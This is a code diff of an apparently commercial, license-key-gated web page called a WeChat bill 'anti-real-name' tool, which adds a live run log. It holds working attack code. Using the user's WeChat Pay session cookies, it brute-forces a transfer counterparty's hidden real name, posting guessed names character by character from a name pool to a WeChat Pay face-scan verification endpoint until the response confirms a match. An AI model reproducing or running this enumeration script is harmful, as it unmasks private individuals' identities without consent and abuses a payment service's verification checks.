@@ -19,20 +19,24 @@
   }
   button:active{opacity:.9}
 
-  /* 结果反馈页面 */
-  .result-page{
+  /* 日志反馈页面 */
+  .log-page{
     position:fixed;top:0;left:0;right:0;bottom:0;
-    background:white;z-index:999;padding:40px 20px;
-    display:none;flex-direction:column;align-items:center;justify-content:center
+    background:#111;z-index:999;padding:20px;
+    display:none;flex-direction:column;color:#fff;
   }
-  .result-page.show{display:flex}
-  .icon{font-size:60px;margin-bottom:20px}
-  .msg{font-size:20px;font-weight:bold;margin-bottom:10px}
-  .name{font-size:24px;color:#07c160;margin:10px 0}
-  .tip{font-size:14px;color:#666;margin-bottom:30px}
-  .back{
-    padding:12px 30px;border-radius:12px;background:#f2f3f5;
-    font-weight:bold
+  .log-page.show{display:flex}
+  .log-title{font-size:18px;font-weight:bold;margin-bottom:10px}
+  .log-content{
+    flex:1;overflow-y:auto;background:#222;
+    padding:15px;border-radius:10px;font-family:monospace;font-size:12px;line-height:1.6
+  }
+  .log-success{color:#07c160}
+  .log-error{color:#ff4d4f}
+  .log-info{color:#999}
+  .close-btn{
+    margin-top:15px;padding:12px;border-radius:12px;
+    background:#333;color:white;border:none;font-weight:bold
   }
 </style>
 
@@ -68,97 +72,108 @@
   </div>
 </div>
 
-<!-- 结果反馈页面（弹层） -->
-<div class="result-page" id="resultPage">
-  <div class="icon" id="icon">✅</div>
-  <div class="msg" id="msgText">查询成功</div>
-  <div class="name" id="nameText"></div>
-  <div class="tip" id="tipText"></div>
-  <div class="back" onclick="closeResult()">返回查询</div>
+<!-- 日志反馈页面（和截图效果一样） -->
+<div class="log-page" id="logPage">
+  <div class="log-title">鱼笙微信账单反实名 - 运行日志</div>
+  <div class="log-content" id="logBox"></div>
+  <button class="close-btn" onclick="closeLog()">关闭窗口</button>
 </div>
 
 <script>
-  // ========== 卡密 ==========
-  const KEY = "yusheng666"
+  // ========== 配置 ==========
+  const MY_KEY = "yusheng666"; // 改成你自己的卡密
+  const CHAR_POOL = "文子俊泽宇嘉浩熠一海晨博睿梓恒毅建家世明永连天川光宗振彦锦智鑫杰凯承启昊伟强海涛有鹏峰斌彬龙昌福林荣辉正利达学祥旭峰少思国新志洪宝兴雨佳思雅美梦欣怡晓雪梓若诗语依涵婉静惠淑芷芸曼灵月琳慕倩安琪丽燕玲萍芳莉娜婷艳梅红珍玉春霞丹萍慧玲巧茹玲燕春丽凤玲子梓嘉晨希宁乐安凡一旭景清沐辰宣然昀书言星文亚新金瑞兆宗令延庆炳洪万长凤秀云桂英德仁义礼智信忠孝昌盛宗祖世传继承光耀荣华宪庆繁祥令德维垂佑钦绍念显扬锡绪同一二三四五六七八九十百千万春夏秋冬东南西北天地日月江河湖海";
+  const URL = "https://payapp.wechatpay.cn/transferbillcertificate/beforefacescan";
 
-  // ========== 字库 ==========
-  const CHAR_POOL = "文子俊泽宇一熠嘉浩晨博睿梓恒毅海建家世明永连天川光宗振彦锦智鑫杰凯承启昊伟强海涛有鹏峰斌彬龙昌福林荣辉正利达学祥旭峰少思国新志洪宝兴雨佳思雅美梦欣怡晓雪梓若诗语依涵婉静惠淑芷芸曼灵月琳慕倩安琪丽燕玲萍芳莉娜婷艳梅红珍玉春霞丹萍慧玲巧茹玲燕春丽凤玲子梓嘉晨希宁乐安凡一旭景清沐辰宣然昀书言星文亚新金瑞兆宗令延庆炳洪万长凤秀云桂英德仁义礼智信忠孝昌盛宗祖世传继承光耀荣华宪庆繁祥令德维垂佑钦绍念显扬锡绪同春夏秋冬东南西北天地日月江河湖二三四五六七八九十百千万"
+  let logPage = document.getElementById("logPage");
+  let logBox = document.getElementById("logBox");
 
-  const URL = "https://payapp.wechatpay.cn/transferbillcertificate/beforefacescan"
-
-  let resultPage = document.getElementById("resultPage")
-  let icon = document.getElementById("icon")
-  let msgText = document.getElementById("msgText")
-  let nameText = document.getElementById("nameText")
-  let tipText = document.getElementById("tipText")
-
-  function showResult(success, name = "") {
-    resultPage.classList.add("show")
-    if (success) {
-      icon.textContent = "✅"
-      icon.style.color = "#07c160"
-      msgText.textContent = "查询成功"
-      nameText.textContent = name
-      tipText.textContent = "已匹配到真实姓名"
-    } else {
-      icon.textContent = "❌"
-      icon.style.color = "#fa3f3f"
-      msgText.textContent = "查询失败"
-      nameText.textContent = ""
-      tipText.textContent = "未匹配到对应姓名"
-    }
+  function openLog() {
+    logPage.classList.add("show");
+    logBox.innerHTML = "";
   }
 
-  function closeResult() {
-    resultPage.classList.remove("show")
+  function closeLog() {
+    logPage.classList.remove("show");
+  }
+
+  function log(msg, type="info") {
+    const div = document.createElement("div");
+    div.className = "log-" + type;
+    div.textContent = msg;
+    logBox.appendChild(div);
+    logBox.scrollTop = logBox.scrollHeight;
   }
 
   async function startQuery() {
-    let key = document.getElementById("key").value.trim()
-    let ek_sid = document.getElementById("ek_sid").value.trim()
-    let uin_session = document.getElementById("uin_session").value.trim()
-    let wxp_log_uid = document.getElementById("wxp_log_uid").value.trim()
-    let len = document.getElementById("len").value
-    let first = document.getElementById("first").value.trim()
-    let last = document.getElementById("last").value.trim()
+    let key = document.getElementById("key").value.trim();
+    let ek_sid = document.getElementById("ek_sid").value.trim();
+    let uin_session = document.getElementById("uin_session").value.trim();
+    let wxp_log_uid = document.getElementById("wxp_log_uid").value.trim();
+    let len = document.getElementById("len").value;
+    let first = document.getElementById("first").value.trim();
+    let last = document.getElementById("last").value.trim();
 
-    if (key !== KEY) {
-      alert("卡密错误")
-      return
+    if (key !== MY_KEY) {
+      alert("❌ 卡密错误");
+      return;
     }
     if (!ek_sid || !uin_session || !wxp_log_uid || !last) {
-      alert("请填写完整信息")
-      return
+      alert("❌ 请填写完整信息");
+      return;
     }
 
-    let headers = {
-      "Content-Type": "application/json;charset=utf-8",
-      "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.69 NetType/WIFI Language/zh_CN"
+    openLog();
+    log("=" .repeat(50), "info");
+    log("鱼笙微信账单反实名", "info");
+    log("3字姓名：输入第一位 + 最后一位", "info");
+    log("2字姓名：只输入最后一位", "info");
+    log("=" .repeat(50), "info");
+    log("ek_sid: " + ek_sid, "info");
+    log("uin_session: " + uin_session, "info");
+    log("wxp_log_uid: " + wxp_log_uid, "info");
+    log("姓名长度: " + len, "info");
+    if (len == 3) {
+      log("首字: " + first, "info");
     }
+    log("尾字: " + last, "info");
+    log("开始尝试...\n", "info");
+
+    const headers = {
+      "Content-Type": "application/json;charset=utf-8",
+      "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.69 NetType/WIFI Language/zh_CN",
+      "Cookie": `ek_sid=${ek_sid};uin_session=${uin_session};wxp_log_uid=${wxp_log_uid}`
+    };
 
     try {
       for (let c of CHAR_POOL) {
-        let name = len == 3 ? (first + c + last) : (c + last)
+        let fullName = len == 3 ? (first + c + last) : (c + last);
 
         let resp = await fetch(URL, {
           method: "POST",
-          headers,
-          body: JSON.stringify({ respondent_true_name: name }),
+          headers: headers,
+          body: JSON.stringify({ respondent_true_name: fullName }),
           mode: "cors"
-        })
+        });
 
-        let t = await resp.text()
-        if (t.includes("成功") || t.includes("face") || t.includes("scan") || t.includes("核验")) {
-          showResult(true, name)
-          return
+        let text = await resp.text();
+        let code = resp.status;
+
+        log(`尝试: ${fullName} | ${code} | ${text.substring(0, 120)}`, "info");
+
+        if (text.includes("成功") || text.includes("face") || text.includes("scan") || text.includes("核验") || text.includes("can_use_scan_face")) {
+          log("\n" + "=" .repeat(50), "success");
+          log(`✅ 匹配成功！真实姓名: ${fullName}`, "success");
+          log("=" .repeat(50), "success");
+          return;
         }
 
-        await new Promise(r => setTimeout(r, 350))
+        await new Promise(r => setTimeout(r, 350));
       }
 
-      showResult(false)
+      log("\n遍历完成，未找到匹配姓名。", "error");
     } catch (e) {
-      alert("请求异常：" + e.message)
+      log(`请求异常: ${e.message}`, "error");
     }
   }
 </script>
